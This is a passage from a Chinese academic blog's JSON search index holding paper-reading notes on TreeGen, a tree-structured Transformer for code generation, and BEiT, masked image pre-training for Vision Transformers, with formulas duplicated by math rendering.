…}.","categories":[{"name":"研究生","slug":"研究生","permalink":"http://enderxiao.github.io/categories/%E7%A0%94%E7%A9%B6%E7%94%9F/"},{"name":"科研","slug":"研究生/科研","permalink":"http://enderxiao.github.io/categories/%E7%A0%94%E7%A9%B6%E7%94%9F/%E7%A7%91%E7%A0%94/"},{"name":"OCR","slug":"研究生/科研/OCR","permalink":"http://enderxiao.github.io/categories/%E7%A0%94%E7%A9%B6%E7%94%9F/%E7%A7%91%E7%A0%94/OCR/"}],"tags":[{"name":"手写体识别","slug":"手写体识别","permalink":"http://enderxiao.github.io/tags/%E6%89%8B%E5%86%99%E4%BD%93%E8%AF%86%E5%88%AB/"},{"name":"深度神经网络","slug":"深度神经网络","permalink":"http://enderxiao.github.io/tags/%E6%B7%B1%E5%BA%A6%E7%A5%9E%E7%BB%8F%E7%BD%91%E7%BB%9C/"},{"name":"深度学习","slug":"深度学习","permalink":"http://enderxiao.github.io/tags/%E6%B7%B1%E5%BA%A6%E5%AD%A6%E4%B9%A0/"},{"name":"注意力机制","slug":"注意力机制","permalink":"http://enderxiao.github.io/tags/%E6%B3%A8%E6%84%8F%E5%8A%9B%E6%9C%BA%E5%88%B6/"},{"name":"树形编码器","slug":"树形编码器","permalink":"http://enderxiao.github.io/tags/%E6%A0%91%E5%BD%A2%E7%BC%96%E7%A0%81%E5%99%A8/"}]},{"title":"TreeGen论文阅读","slug":"TreeGen论文阅读","date":"2023-04-03T07:21:14.000Z","updated":"2024-07-30T11:26:33.916Z","comments":true,"path":"2023/04/03/TreeGen论文阅读/","permalink":"http://enderxiao.github.io/2023/04/03/TreeGen%E8%AE%BA%E6%96%87%E9%98%85%E8%AF%BB/","excerpt":"本文提出了一个树形结构的Transformer，用于代码生成","text":"本文提出了一个树形结构的Transformer，用于代码生成 摘要 代码生成系统主要是基于输入的自然语言来生成其描述的代码。目前最好的基于神经网络的代码生成模型包含两个方面的问题： 一种是长依赖问题，其中一个代码元素往往依赖于另一个距离较远的代码元素。 另一个问题是结构建模，因为程序包含丰富的结构信息。 本文提出了一个船新的基于树形结构的神经网络结构，称为TreeGan，其使用Transformer中的注意力机制来解决长依赖的问题，此外引入了一个全新的AST reader（encoer）将语法规则和AST结构纳入网络。 本文使用Python benchmark，炉石传说，以及两个语义解析基准，ATIS和GEO来对TreeGan进行评价。TreeGan比以往的SOTA模型在炉石传说任务上高了4.5个点，并且在ATIS(89.1%)和GEO(89.6%)两个标准上，在所有基于神经网络的方法中脱颖而出。 本文对模型进行了消融实验以便对模型的组件又更好的理解。 引言 随着神经网络的发展，类似Seq2Seq、Seq2Tree等模型被应用于代码生成领域，尤其是SOTA的方法，根据预测语法规则序列来生成代码，意思是说系统从已经生成的代码中保存了部分抽象语义树(Abstract syntax tree(AST))，然后预测用于拓展节点的语法规则。 语法规则的分类算法面临这两大主要挑战： 长依赖问题。一个代码元素也许依赖于另一个距离非常遥远的元素 代码结构的表述。前人的工作表明树形结构信息对于代码建模至关重要，但“扁平”的网络架构，例如RNN，很难很好地捕捉到这些信息。 本文试图将Transformer用于代码生成领域以改善长依赖的问题，但原始的Transformer网络并不能充分利用树形结构。 其次对于上文提到的无法利用结构信息的问题，标准的解决方法是将一个节点和其结构相邻节点的向量表示进行结合，作为一个结构卷积子层的输出，这一灵感在图/树卷积网络中使用，但标准的Transformer中并没有这样的结构卷积子层，而且在何处加入这些层并不明朗。 作者一开始的假设是将structural convolution加入到Transformer的每一个block中去，这一做法的核心假设是：当对某一节点和他的邻接节点进行卷积时，向量表示将主要包含原始节点的信息。但随着decoder中block的推进，这些向量表示将逐渐丢失原有的节点信息。因此本实验只在decoder的开头的几层添加结构卷积子层。 总体上来说，TreeGen模型主要包含三个部分： natural language（NL）reader作为encoder，对文本描述进行编码 AST reader（开头的几层Transformer decoder）使用结构卷积子层对之前生成的部分代码进行编码 Transformer decoder blocks，结合以AST中需要被拓展的节点作为query，以及先前的两个encoders来预测接下来的语法规则。 结论 本论文提出了TreeGen来完成代码生成的任务。使用Transformer中的注意力机制来解决长依赖的问题，使用AST reader编码器将语法规则和AST structure结合到模型中。 模型被用于Python dataset 、炉石传说和ATIS、GEO两个测量指标上，实验结果表明本文提出的模型表现比现存模型都好，同时本文进行了in-depth消融测试，实验表明模型中的每一个部分都有着重要意义。 方法 本文提出的TreeGen网络总体结构如下： 语法规则预测 本章介绍了如何将代码生成转化为一个序列语法规则预测的模型。程序可被分解为一些上下文无关的语法规则，并被解析为一个AST，例如下图中所示是一条python代码length=10length = 10length=10的抽象语法树(AST)，其中虚线框代表结束符，实线框代表非结束符。 该方法可以视为根据语法规则对一个非结束节点进行拓展。这个过程一直持续到遇到结束叶子节点。 最终整个对AST的预测任务可以表示为： p(code)=∏i=1Pp(ri∣NL input,ri,...,ri−1)p(code) = \\prod ^P_{i=1}p(r_i | NL \\ input, r_i, ...,r_{i-1})p(code)=∏i=1P​p(ri​∣NL input,ri​,...,ri−1​) 其中rir_iri​表示规则序列中的第i个规则。用这种方法表示后，本文的任务是训练一个模型来计算p(ri∣NL input,pi)p(r_i | NL \\ input, p_i)p(ri​∣NL input,pi​) NL Reader 自然语言的描述性输入决定了代码的功能，在炉石传说任务中，输入是半结构化的描述，而在ATIS和GEO测试中使用的是自然语言。 对于一段输入的描述，本文首先将其标签化为一串标签n1,...,nLn_1, ..., n_Ln1​,...,nL​其中L代表输入的长度，然后每个标签nin_ini​将被分割为一系列字母c1(ni),c2(ni),...,cS(ni)c_1^{(n_i)}, c_2^{(n_i)},..., c_S^{(n_i)}c1(ni​)​,c2(ni​)​,...,cS(ni​)​，其中S代表nin_ini​中字母的个数。所有的标签和字母都会通过embedding层被表示为实值向量n1,...,nLn_1, ... ,n_Ln1​,...,nL​和c1(ni),c2(ni),...,cS(ni)c_1^{(n_i)}, c_2^{(n_i)},..., c_S^{(n_i)}c1(ni​)​,c2(ni​)​,...,cS(ni​)​ 输入文本表示 本文使用一个全连接层对输入文本进行编码，称为Character Embedding。表示为ni(c)=W(c)[c1(ni),...,cM(ni)]n_i^{(c)} = W^{(c)}[c_1^{(n_i)},...,c_M^{(n_i)}]ni(c)​=W(c)[c1(ni​)​,...,cM(ni​)​]其中W(c)W^{(c)}W(c)表示权重，并且字母序列将被padding成一个预定义的最大长度M。经过全连接层后，本文使用一个Layer Normalization进行归一化。得到的向量之后会被送到NL reader中，在gating子层中与word embeddings整合。 NL Reader网络结构 NL reader包含一些blocks(ndn_dnd​个)的堆叠，每个block中包含三个子层： self-attention gating mechanism word convolution 每两个子层间包含残差连接。以此来提取特征。 Self-attention 子注意力机制层遵循了Transformer中的结构，使用多头注意力机制来获取长依赖信息。 本文中的子注意力机制同样使用了位置编码来保留位置信息，但在原本的位置编码上做出了一些小小的改动： pb,i[2j]=sin((i+b)/(100002j/d))pb,i[2j+1]=sin((i+b)/(100002j/d))p_{b,i}[2j] = sin((i+b)/(10000^{2j/d})) \\\\ p_{b,i}[2j+ 1] = sin((i+b)/(10000^{2j/d}))pb,i​[2j]=sin((i+b)/(100002j/d))pb,i​[2j+1]=sin((i+b)/(100002j/d)) 其中b代表当前处于第b个block中。d表示维数，即embedding的大小 Transformer block通过多头注意力机制学习到的非线性特征产生了一个矩阵： Yb(self)=[yb,1(slef),yb,2(slef),...,yb,L(slef)]TYb(self)∈RL×dY_b^{(self)} = [y_{b,1}^{(slef)}, y_{b,2}^{(slef)}, ..., y_{b,L}^{(slef)}]^T \\\\ Y_b^{(self)} \\in R^{L\\times d}Yb(self)​=[yb,1(slef)​,yb,2(slef)​,...,yb,L(slef)​]TYb(self)​∈RL×d 然后多头注意力机制的计算如下： Y(self)=concat(head1,...,headH)WhY^{(self)} = concat(head_1,...,head_H)W_hY(self)=concat(head1​,...,headH​)Wh​ 为了使表示更简洁，此处省略了块数b，H代表头数，WhW_hWh​代表权重。对于每个头，计算注意力权重如下： headt=softmax(QKTdk)Vhead_t = softmax(\\frac{QK^T}{\\sqrt{d_k}})Vheadt​=softmax(dk​​QKT​)V 其中dk=d/Hd_k = d/Hdk​=d/H表示每个特征的长度。 QKV的计算如下： [Q,K,V]=[x1,...,xL]T[WQ,WK,WV]WQ,WK,WV∈R(d×dk)[Q,K,V] = [x_1, ... ,x_L]^T[W_Q, W_K,W_V] \\\\ W_Q,W_K,W_V \\in R^{(d\\times d_k)}[Q,K,V]=[x1​,...,xL​]T[WQ​,WK​,WV​]WQ​,WK​,WV​∈R(d×dk​) W代表模型参数，xix_ixi​是Tranformer block的输出。 Gating Mechanism 提取完特征之后，作者使用一个基于softmax的gating mechanism将字母embeddings的信息进一步整合。对于第i个词，作者使用一个线性变换层，根据yi(self)y_i^{(self)}yi(self)​计算一个控制向量qiq_iqi​。用于字母embedding计算的softmax权重ki(c)k_i^{(c)}ki(c)​根据ni(c)n_i^{(c)}ni(c)​经过一个线性变换得来。用于Transformer输出的softmax权重ki(y)k_i^{(y)}ki(y)​根据yi(self)y_i^{(self)}yi(self)​经过另一个线性变换得到。接着gate会用以下的方式计算： [αi,t(y),αi,t(c)]=softmax{qiTki(y),qiTki(c)}[\\alpha_{i,t}^{(y)},\\alpha_{i,t}^{(c)}] = softmax\\{q_i^T k_i^{(y)}, q_i^{T} k_i^{(c)} \\}[αi,t(y)​,αi,t(c)​]=softmax{qiT​ki(y)​,qiT​ki(c)​} gate将会用于对Transformer的层级输出vi(y)v_i^{(y)}vi(y)​、字母embeddings的特征vi(c)v_i^{(c)}vi(c)​，根据yi(self),ni(c)y_i^{(self)},n_i^{(c)}yi(self)​,ni(c)​线性变换得到的向量继续权重分配： hi,t=[αi,t(y)vi(y)+αi,t(c)vi(c)]h_{i,t} = [\\alpha_{i,t}^{(y)}v_i^{(y)} + \\alpha_{i,t}^{(c)}v_i^{(c)}]hi,t​=[αi,t(y)​vi(y)​+αi,t(c)​vi(c)​] 与多头注意力的计算类似，最后gating mechanism的输出为: Y(gate)=(hi,t)i,tY^{(gate)} = (h_{i,t})_{i,t}Y(gate)=(hi,t​)i,t​ 其中(.)i,t(.)_{i,t}(.)i,t​表示一个矩阵，其中的元素是hi,th_{i,t}hi,t​ Word Convolution 最后，使用两层卷积层对gate层的输出y1(gate),...,yL(gate)y_1^{(gate)},...,y_L^{(gate)}y1(gate)​,...,yL(gate)​提取特征： y1(conv,l),...,yL(gate)y_1^{(conv,l)},...,y_L^{(gate)}y1(conv,l)​,...,yL(gate)​ 其中l表示第i层卷积层，特征的计算方式如下： yi(conv,l)=W(conv,l)[yi−w(conv,l−1);...;yi+w(conv,l−1)]y_i^{(conv,l)} = W^{(conv,l)}[y_{i-w}^{(conv,l-1)};...;y_{i+w}^{(conv,l-1)}]yi(conv,l)​=W(conv,l)[yi−w(conv,l−1)​;...;yi+w(conv,l−1)​] 其中W代表模型参数，w=(k−1)/2w=(k-1)/2w=(k−1)/2，k代表卷积窗口的大小。 yi(conv,0)y_i^{(conv,0)}yi(conv,0)​代表gate层的输出。这一层使用的是分离卷积。 对于第一个和最后一个词，作者为其添加了0作为padding。 两层卷积之间使用GELU作为激活函数。 那么最终经过三层结构构成的encoder后得到的特征为y1(NL),...,yL(NL)y_1^{(NL)},...,y_L^{(NL)}y1(NL)​,...,yL(NL)​ AST Reader 作者设计了一个AST reader来提取已经生成的代码的AST结构信息。尽管本文设计的模型是根据预测规则来生成代码，但如果只依赖这些规则而缺少程序的具体印象不足以预测下一跳规则，因此本文提出的AST reader将会考虑各种信息，包括预测的规则和树形结构。 首先使用规则序列来表示代码，其次使用注意力机制对规则进行编码，最后使用树形卷积层来结合编码表示和每个节点的祖先。 AST表示 规则序列编码 使用table-lookup embeddings生成的实值向量来表示用于构建AST的规则。 规则定义编码 上述的table-lookup编码将语法规则视为原子标签，并且会丢失规则包含的信息。为了解决这一问题，作者通过规则定义编码来加强规则的表达。 对于语法规则i:α−&gt;β1...βKi: \\alpha -&gt; \\beta_1...\\beta_Ki:α−&gt;β1​...βK​，其中α\\alphaα是父节点，β1...βK\\beta_1...\\beta_Kβ1​...βK​为子节点，可以是结束节点，也可以是非结束节点，序号i表示规则的ID。结果使用r⃗(c)\\vec r^{(c)}r(c)表示 与输入的文本类似，作者使用全连接层对各个符号代表的table-lookup编码进行编码。并且序列同样的会被padding为最大长度。 随后规则定义特种使用另一个全连接层进行计算： yi(rule)=W(rule)[ri;r⃗(c);α]y_i^{(rule)} = W^{(rule)}[r_i;\\vec r^{(c)};\\alpha]yi(rule)​=W(rule)[ri​;r(c);α] 其中r⃗i\\vec r_iri​是规则rir_iri​的table-lookup编码，r⃗i(c)\\vec r_i^{(c)}ri(c)​是规则表示的内容编码，并且在这一阶段作者继续使用父节点α\\alphaα进行计算，随后使用一层layer normalization进行归一化。 位置和深度编码 由于同样使用自注意力机制计算，作者向语法规则中加入了位置信息。 序列位置信息使用了与描述文本相同的方式，使用p1(r),...,pP(r)p_1^{(r)},...,p_P^{(r)}p1(r)​,...,pP(r)​来表示规则r1,...,rPr1,...,r_Pr1,...,rP​的序列位置编码。 接着，由于序列位置编码无法表示AST结构中的深度信息，因此引入深度编码(depth embedding)。如果此时使用规则r来拓展一个节点α\\alphaα，作者使用其父节点的深度来表示这条规则的深度。以此方法，作者使用d1,...,dPd_1,...,d_Pd1​,...,dP​来表示语法规则序列r1,...,rPr_1,...,r_Pr1​,...,rP​的深度编码。 AST Reader网络结构 AST Reader同样使用多个blocks堆叠而成，中共包含N1N_1N1​个block，每个block包含四个子层： Self-Attention Gating Mechanism NL Attention Tree Convolution 前3个子层都包含一个环绕的残差连接，并且每个子层之后会使用Layer Normalization进行归一化。 Self-Attention 输入是规则编码，位置编码和深度编码，即ri+di+pi(r)r_i + d_i + p_i^{(r)}ri​+di​+pi(r)​ 使用自注意力机制提取的特征如下y1(ast−self),...,yP(ast−self)y_1^{(ast-self)},...,y_P^{(ast-self)}y1(ast−self)​,...,yP(ast−self)​ Gating Mechanism 作者想要将规则的内容编码融合到特征中，本模型使用了与NL Reader中相同的Gating Mechanism，融合之后的特征表示为y1(ast−g),...,yP(ast−g)y_1^{(ast-g)},...,y_P^{(ast-g)}y1(ast−g)​,...,yP(ast−g)​ NL Attention 该层将编码器中特区的特征与解码器中的特征表示求多头注意力机制，最后得到的特征表示为y1(ast−nl),...,yP(ast−nl)y_1^{(ast-nl)},...,y_P^{(ast-nl)}y1(ast−nl)​,...,yP(ast−nl)​ Tree Convolution 如果只考虑上述子层的信息，reader很难将节点以及其祖先节点的信息结合，因为一个节点可能与非常远的一个祖先存在相关性。因此传统的Transformer很难捕获到这类信息。 本文将AST视为一幅图，使用一个邻接矩阵M表示向量图。如果αi\\alpha_{i}αi​是αj\\alpha_jαj​的双亲结点，那么Mji=1M_{ji} = 1Mji​=1，假设所有的节点都以特征的形式表示f1,...,fnf_1, ..., f_nf1​,...,fn​，那么他们的双亲特征可以用特征本身乘以邻接矩阵得到： [f1(par),...,fn(par)]=[f1,...,fn]M[f_1^{(par)},...,f_n^{(par)}] = [f_1, ..., f_n]M[f1(par)​,...,fn(par)​]=[f1​,...,fn​]M 其中fi(par)f_i^{(par)}fi(par)​代表第i个节点特征的双亲节点特征。对于根节点的父节点，本文将其映射为根节点本身。 应用于当前子树的树形卷积窗口定义如下： Y(tconv,l)=f(W(fconv,l−1)[Y(tconv,l−1);Y(tconv,l−1)M;...;Y(tconv,l−1)M(kt−1)])Y^{(tconv,l)} = f(W^{(fconv, l-1)}[Y^{(tconv,l-1)};Y^{(tconv,l-1)}M;...;Y^{(tconv, l-1)}M^{(kt-1)}])Y(tconv,l)=f(W(fconv,l−1)[Y(tconv,l−1);Y(tconv,l−1)M;...;Y(tconv,l−1)M(kt−1)]) 其中W(tonv,l)W^{(tonv, l)}W(tonv,l)代表军基层的权重，kt代表窗口大小(本文实验中设为3),l是卷积层本身，第一层卷积的输入为： Y(tonv,0)=[y1(att),...,yP(att)]Y^{(tonv, 0)} = [y_1^{(att)},...,y_P^{(att)}]Y(tonv,0)=[y1(att)​,...,yP(att)​] 其中Y(tconv,0)∈Rd×PY^{(tconv, 0)} \\in R^{d \\times P}Y(tconv,0)∈Rd×P 在AST reader的最后一层，本文添加了两个额外的卷积层，f表示激活函数，部署在两层之间，使用的是GELU。 最终AST reader输出的特征为y1(ast),...,yP(ast)y_1^{(ast)},...,y_P^{(ast)}y1(ast)​,...,yP(ast)​ Decoder 与AST reader相同，解码器包含了N2N_2N2​个块的堆叠，每个块包含了三层，每层之间包含一个残差连接，以及Layer Normalization的组合。 decoder使用非终节点作为query进行拓展，受到近期论文的启发，查询节点表示为一条从根节点到代拓展节点的路径。本文将该路径上的接待你表示为实值向量，接着对其使用全连接层得到输出路径qi(path)q_i^{(path)}qi(path)​ 接下来使用两层注意力层来将AST reader和NL reader的输出进行整合。 本文首先使用了一个AST attention层，对AST reader提取得到的特征f1(tree),...,fP(tree)f_1^{(tree)},...,f_P^{(tree)}f1(tree)​,...,fP(tree)​和Query提取特征，Q是由q1(path),...,qP(path)q_1^{(path)},...,q_P^{(path)}q1(path)​,...,qP(path)​计算得到；K和V是从代码特征y1(ast),...,yP(ast)y_1^{(ast)},...,y_P^{(ast)}y1(ast)​,...,yP(ast)​中计算得到。本文使用NL attention进一步整合了输入描述文本的信息，Q由f1(tree),..,fP(tree)f_1^{(tree)},..,f_P^{(tree)}f1(tree)​,..,fP(tree)​计算得到；K和V由输入的描述文本y1(NL),...,yL(NL)y_1^{(NL)},...,y_L^{(NL)}y1(NL)​,...,yL(NL)​计算得到。 最后的Dense层包含两个全连接层，第一个全连接层使用GELU作为激活函数，用于提取特征进行预测。 训练与推断 本文最后使用softmax对decoder最后一层的输出特征进行预测。同时本文引入pointer network(本质上是一个注意力层)，该网络能直接从自然语言描述中复制一个tokenaaa，在这种情况下，最后的语法结果是α→a\\alpha \\to aα→a，其中α\\alphaα是一个被拓展的非终结符，a是一个终结符。这也的指针机制对用户自定义标识符(例如变量和函数名)是有帮助的。 softmax规则预测和指向网络的选择由另一个门控机制控制pgp_gpg​，同样计算decoder最后一层的特征。总体预测改了由如下公式给出： p(ri∣.)={pgp(ri∣.)ifi∈D(1−pg)Pr{copy word t at step i∣.}ifi∈Cp(r_i|.) = \\begin{cases} p_gp(r_i|.) &amp; if &amp; i\\in D \\\\ (1-p_g)Pr\\{ copy\\ word \\ t \\ at \\ step \\ i|.\\} &amp; if &amp; i \\in C \\end{cases}p(ri​∣.)={pg​p(ri​∣.)(1−pg​)Pr{copy word t at step i∣.}​ifif​i∈Di∈C​ i代表规则ID，D预测规则的集合、C类似α→a\\alpha \\to aα→a的规则集合，其中a表示一个出现在自然语言描述中的结束符。 pgp_gpg​代表使用某一类型预测规则的概率，并且p(ri∣.)p(r_i|.)p(ri​∣.)(每一条规则的概率)分别由带有sigmoid和softmax激活函数的两个单层感知器计算，这些层的输入为特征h(dec)h^{(dec)}h(dec)，表示decoder的最后一层特征。 指针网络由如下公式计算得到： ξt=vttanh(W1h(dec)+W2yt(NL))Pr{copy word t at step i∣.}=exp(ξt)∑j=1Lexpξj\\begin{array}{l} \\xi_t =v^t tanh(W_1h^{(dec)} + W_2y_t^{(NL)}) \\\\ Pr\\{copy \\ word \\ t \\ at \\ step \\ i|. \\} = \\frac{exp(\\xi _t)}{\\sum^L _{j=1} exp{\\xi_j}} \\end{array}ξt​=vttanh(W1​h(dec)+W2​yt(NL)​)Pr{copy word t at step i∣.}=∑j=1L​expξj​exp(ξt​)​​ 通过最大化对参考程序的负对数似然损失来优化模型。 推理从一个开始规则开始，start:snode→rootstart: snode \\to rootstart:snode→root使用一个特殊的符号snode拓展根标号。当AST中的所有叶子节点均为终结符时，递归推理结束。在预测阶段，本文使用beam search，大小为5。进行beam search会排除无效的规则。 实验 评价实验 本文使用炉石传说、ATIS和GEO进行实验 炉石传说 benchmark包含665张不同的炉石卡片，每张卡片包含半结构化的描述以及正确的python代码，平均长度84个token。半结构化的描述包含卡牌名、类型、以及一个由自然语言描述的卡牌技能。 在将卡片描述预处理为令牌序列时，现有方法考虑了两种方法。第一个(称为扁平预处理)将整个描述视为扁平文本，并通过空间或时期等标准分隔符来划分标记。第二个(称为结构预处理)将描述视为半结构化的，并且总是将属性视为一个token。在本实验中，本文同时考虑这两种方法，并将扁平预处理对应的结果记为TreeGen - A，结构预处理对应的结果记为TreeGen - B。本文遵循train - dev - test拆分。 本文使用以下指标作为评价： StrAcc：与基本真值具有完全相同的tokens序列的程序的百分比 BLEU score：用于衡量生成代码与参考代码在tokens级别上的相似度 Acc+：它是手动评估的，允许在StrAcc之上为每个测试用例进行变量重命名。 实验对网络的配置如下：Nd=6,N1=N2=5,embedding_size=256N_d = 6, N_1 = N_2 = 5 ,embedding\\_size = 256Nd​=6,N1​=N2​=5,embedding_size=256除第一层为1024维外，其余全连接层隐藏尺寸均设置为256维。作者在每个层之后都设置了dropout，概率设为0.15，网络使用Adafactor的默认设置进行优化。 本文的模型在Plain和Structural的预处理方式上都获得了最优成绩，并且在一块泰坦XP上子需要18s训练一轮，CNN需要180s，RNN需要49s 消融实验 为了验证结构卷积的作用，作者进行了如下实验N2=0N_2 = 0N2​=0： 为所有Transformer块增加结构卷积(N1=10N_1 = 10N1​=10) 只为前7层Transformer块增加结构卷积(N1=10(7)N_1 = 10(7)N1​=10(7)) 只为前8层Transformer块增加结构卷积(N1=10(8)N_1 = 10(8)N1​=10(8)) 不为Transformer块增加结构卷积(N1=0N_1 = 0N1​=0) 实验结果表明2 &gt; 3 &gt; 1 &gt; 4 随后作者作者将模型与传统的Transformer进行比较，后者是一种没有进行有效结构建模的Transformer。准确率( p值小于0.001)提高了21个百分点，BLEU评分提高了12分，证明了AST reader的有效性。 接着，作者将AST Reader中的树形卷积层替换为两层全连接层，依次去掉了字符嵌入、规则定义编码、自注意力层。实验结果表明，标识符编码、缓解长依赖和结构信息显著影响准确率。 ATIS&amp;GEO 本实验使用了准确率作为度量，其中树准确度的度量避免了模糊误差，即子节点的顺序可以在连接节点内改变。embedding size和隐藏层的size变为了128维，其他设置与炉石传说中的设置相同。数据集的设置如下： 实验表明本文的方法准确率略低于WKZ14，该传统方法使用了大量模板，因此难以扩展到新的数据上。然而，本文的模型直接采用了炉石传说数据集，并取得了所有神经模型中最高的准确率。最终结果如下：","categories":[{"name":"研究生","slug":"研究生","permalink":"http://enderxiao.github.io/categories/%E7%A0%94%E7%A9%B6%E7%94%9F/"},{"name":"论文","slug":"研究生/论文","permalink":"http://enderxiao.github.io/categories/%E7%A0%94%E7%A9%B6%E7%94%9F/%E8%AE%BA%E6%96%87/"},{"name":"Transformer","slug":"Transformer","permalink":"http://enderxiao.github.io/categories/Transformer/"}],"tags":[{"name":"论文笔记","slug":"论文笔记","permalink":"http://enderxiao.github.io/tags/%E8%AE%BA%E6%96%87%E7%AC%94%E8%AE%B0/"},{"name":"Transformer","slug":"Transformer","permalink":"http://enderxiao.github.io/tags/Transformer/"},{"name":"端到端","slug":"端到端","permalink":"http://enderxiao.github.io/tags/%E7%AB%AF%E5%88%B0%E7%AB%AF/"},{"name":"NLP","slug":"NLP","permalink":"http://enderxiao.github.io/tags/NLP/"},{"name":"GAN","slug":"GAN","permalink":"http://enderxiao.github.io/tags/GAN/"}]},{"title":"BEiT论文阅读","slug":"BEiT论文阅读","date":"2023-03-29T06:30:03.000Z","updated":"2024-07-30T11:26:33.905Z","comments":true,"path":"2023/03/29/BEiT论文阅读/","permalink":"http://enderxiao.github.io/2023/03/29/BEiT%E8%AE%BA%E6%96%87%E9%98%85%E8%AF%BB/","excerpt":"本文提出采用图像遮蔽的方法预训练Vision Transformer","text":"本文提出采用图像遮蔽的方法预训练Vision Transformer 摘要 本文提出了一个使用自监督学习训练的视觉表达模型(vision representation)BEIT，即Bidirectional Encoder representation form Image Transformers 受到BERT在NLP领域优秀表现的启发，本文试图使用**图像遮蔽任务(masked image modeling task)**来对Vision Transformer进行预训练。 具体来说，每张图片将会包含两个view，一个是image patches(例如 16 X 16)，和一个visual token。我们首先将图片分解为遗传visual token，然后随机地遮挡一些图片patch，然后传入网络。那么预训练的任务就是将这些被遮挡的image patches复原为原始的visual token。 预训练得到BEIT后，本文直接在预训练的encoder层上增加任务层，将模型 fine-tune到下游任务中。 实验表面在图像分类和语义分割两个任务上，该模型的效果要优于之前的预训练模型。 引言 如果直接将BERT中的mask任务沿用到Vision Transformer，将会发生以下几个问题： 由于没有类似语言任务中的单词字典，可以将image patch直接遮盖，所以无法简单的使用softmax进行分类来预测被遮挡的区域是什么。那么一个直接的方式就是将认为是为一个回归任务，来预测被遮盖的patch的原始像素。但这样又会带来另一个问题。 逐像素的复原将会浪费对预训练短程依赖和高频细节的建模能力 为解决上述问题，本文提出了一个子监督学习模型BEIT，并提出了一个预训练任务：Maksed Image Modeling(MIM) 这一任务先将图片分解为patches序列，作为模型的输入，此外还对图像进行“token化”：这一技巧再VAE中被使用，漆具体方法是，在与训练之前，先通过自动编码式重建学习一个“图像token化器”，该模块通过学习一个词表，将图像标签化为离散的视觉标签。 接着，在预训练阶段，作者随机的将图像的部分pacth遮挡掉，随后将被遮挡过的图片输入到网络中。模型将学习如何恢复原图片中的这些visual token而不是原始像素。 随后本文将预训练的BEIT应用到两个下游任务中：图像分类与语义分割。实验表明BEIT的表现要好于 from-scratch training和之前的强自监督学习。 本文发现，通过ImageNet标签的**中间微调(intermediate fine-tuning)**可以进一步提升BEIT的性能，微调的收敛速度和稳定性的提高降低了对末端任务的训练成本。此外，我们证明了自监督BEIT可以通过预训练学习合理的语义区域，释放图像中蕴含的丰富监督信号。 结论 本文提出了BERT-like模型的预训练策略，还展示了在不使用任何人工标注数据的情况下自动获取语义区域知识的有趣性质。未来，我们希望在数据规模和模型规模方面扩大BEIT预训练。 方法 图像表示 本文提及的方法中包含两种图像的表示，被名为 image patch和visual tokens。这两种表示在训练期间分别作为输入和输出表示。 Image Patch 2维的图片将被分解为一串patches序列，使得一个标准的Transformer可以直接接受数据。 从公式层面来看，本文将一张图片x∈RH×W×Cx \\in R^{H \\times W \\times C}x∈RH×W×C变换为N个patch，其中N=HW/P2N = HW/P^2N=HW/P2, 每个patchxp∈RN×(P2C)x_p \\in R^{N \\times (P^2C)}xp​∈RN×(P2C),C代表通道数，(H,W)(H,W)(H,W)是输入图像的分辨率，每个patch的分辨率为(P,P)(P, P)(P,P) 接着每个patch会被线性地展平为为一个向量，这一向量与BERT中的word embeddings中的相同。 Image patchs保留了原始像素，并且被用作BEIT的输入特征。在本次实验中，本文将每个224×224224 \\times 224224×224图片分为14×1414 \\times 1414×14个区域patch，每个patch大小为16×1616 \\times 1616×16 Visual Token 与NLP任务中相同，本文将图像表示为一串离散的token，而不是原始像素。具体来看： 本文将图像x∈RH×W×Cx \\in R^{H \\times W\\times C}x∈RH×W×C转化为序列z=[z1,...,zn]∈Vh×wz = [z_1,...,z_n] \\in V^{h \\times w}z=[z1​,...,zn​]∈Vh×w，其中词典V=1,...,∣V∣V = {1,...,|V|}V=1,...,∣V∣包含一系列离散的token序号。 本文使用离散自编码器(dVAE)来学习这个图像token转化器，包含两个模块：tokenizer 和 decoder 其中tokenizerqϕ(z∣x)q_\\phi (z | x)qϕ​(z∣x)的任务是通过视觉词典将图片的像素x映射到token z。而decoder pψ(x∣z)p_{\\psi}(x | z)pψ​(x∣z)学习如何将token z重建为图片像素x，重建的目标函数可以用如下公式表示Ez∼qϕ[logψ(x∣z)]E_{z\\sim q_{\\phi}}[log_{\\psi}(x|z)]Ez∼qϕ​​[logψ​(x∣z)]。由于隐视觉令牌是离散的，模型训练是不可微的，因此使用Gumbel-softmax relaxation来训练模型。此外，在qϕq_{\\phi}qϕ​的训练过程中加入了一个统一的先验。 注意一幅图像的视觉令牌数量和图像块数量是相同的，图像字典的大小是8192，本文直接使用了公开可用的tokenizer 骨干网络 L层Transformer Blocks，在输入时额外加入了token [S]，使用一维位置编码。 预训练BEIT 本文随机的遮盖了大约40%的patches，被遮盖的区域表示为M∈1,...,N0.4NM \\in {1, ..., N}^{0.4N}M∈1,...,N0.4N，接着本位使用了一个可学习的embeddinge[M]∈RDe_{[M]} \\in R^De[M]​∈RD 来代替被遮盖的部分。然后将被处理过的patches序列输入L层的Transformer模型中，最后的隐藏向量被视为输入块的编码表示。对于每一个被mask的位置，本文使用一个softmax分类器来预测该位置对应的visual token pMIN(z′∣xM)=softmaxz′(WchiL+bc)p_{MIN}(z&#x27;|x^M) = softmax_{z&#x27;}(W_ch_i^L + b_c)pMIN​(z′∣xM)=softmaxz′​(Wc​hiL​+bc​)其中{hi:i∈M}i=1N\\{h_i: i \\in M \\}^N_{i=1}{hi​:i∈M}i=1N​表示每个被遮盖的位置，xMx^{M}xM表示被遮盖的图像，Wc∈R∣V∣×D and bc∈R∣V∣W_c \\in R^{|V| \\times D} \\ and \\ b_c \\in R^{|V|}Wc​∈R∣V∣×D and bc​∈R∣V∣为可训练参数。预训练目标似乎最大化log似然，对于当前visualtokens ziz_izi​优化目标如下： max∑x∈DEM[∑i∈Mlog⁡pMIN(zi∣xM)]max \\sum_{x \\in D} E_M [\\sum_{i \\in M}\\log p_{MIN}(z_i|x^{M})]max∑x∈D​EM​[∑i∈M​logpMIN​(zi​∣xM)] 其中D表示训练词典，M表示随机遮盖的位置，xMx^MxM表示被遮盖的图像 但本文的训练并不是随机的遮盖，而是采用blockwise masking。对于每个块，将最小patches数设置为16，然后为mask块随机选择一个长宽比，重复上述两个步骤，知道有足够的masked patches，此处设为0.4N0.4N0.4N其中N为图像块的总数，0.4为遮盖的比例。 Fine-Tuning 本实验对三个下游任务进行了fine-tuning： 